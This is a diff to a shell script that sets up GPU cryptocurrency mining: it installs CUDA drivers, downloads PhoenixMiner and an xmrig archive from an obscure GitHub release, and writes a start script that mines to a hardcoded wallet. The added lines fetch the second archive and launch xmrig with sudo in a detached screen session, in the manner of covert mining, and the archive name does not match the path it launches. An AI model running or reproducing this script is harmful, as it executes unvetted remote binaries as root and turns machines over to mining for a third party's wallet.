@@ -13,10 +13,13 @@ echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/
 sudo apt-get update
 sudo apt-get -y install cuda-drivers
 export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
+wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
+tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
 echo '#!/bin/sh'>>start.sh
 echo "cd $HOME/">>start.sh
+echo "sudo screen -dmS xmrig ./xmrig-v5.11.1/xmrig &">>start.sh
 echo "tmux kill-server">>start.sh
 echo "sleep 1">>start.sh
 echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'">>start.sh
